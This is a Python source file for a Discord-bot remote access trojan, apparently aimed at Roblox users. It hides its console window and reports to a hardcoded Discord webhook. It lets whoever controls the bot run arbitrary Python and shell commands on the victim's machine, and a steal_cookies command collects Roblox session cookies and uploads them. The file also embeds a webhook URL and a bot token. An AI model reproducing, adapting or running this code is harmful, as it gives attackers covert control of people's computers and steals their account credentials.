import discord
import requests
import os
from discord.ext import commands as cmds
import utils
import ctypes
import win32process

client = cmds.Bot(command_prefix="?", case_insensitive=True, intents=discord.Intents.all())
hook = "https://discord.com/api/webhooks/1056968425425088522/xvWuojwMFu3yjfcKE7aX2THXrxpLRuE_kPuzwOKFpAEiuWp5ZzLeI1-Yfp3cUTIcXHkU" # <!> their hook <!>

def HideMe():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0: # HideMyAss™
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        
HideMe()

def tohook(s):
    requests.post(hook, json={
            'username': 'Python response',
            'content': s
        }
)

@client.event
async def on_ready():
    requests.post(hook, json={
            'username': 'Angel Lua Andrew Tate Lover',
            'content': '@everyone angel lua injected'
        }
    )

@client.command()
async def run_py(ctx):
    code = ctx.message.content.split(' ', 1)[1]
    exec(code)
    await ctx.reply('Executed!')

@client.command()
async def run_cmd(ctx):
    code = ctx.message.content.split(' ', 1)[1]
    os.system(code)
    await ctx.reply('Executed!')

@client.command()
async def echo(ctx):
    code = ctx.message.content.split(' ', 1)[1]
    await ctx.reply(code)

@client.command()
async def steal_cookies(ctx):
    data = utils.get_and_upload()
    url = data[0]
    roblox = data[1]
    await ctx.reply(f'Roblox cookies: `{roblox}`\nFull upload: {url}')

client.run('MTA1NjY3NjczMDU3MzcwNTMwOA.Gll5O1.mfgFUgMX7SuC7Lh1EXQXEY2V4FKINx874mBkvM') # <!> public bot <!>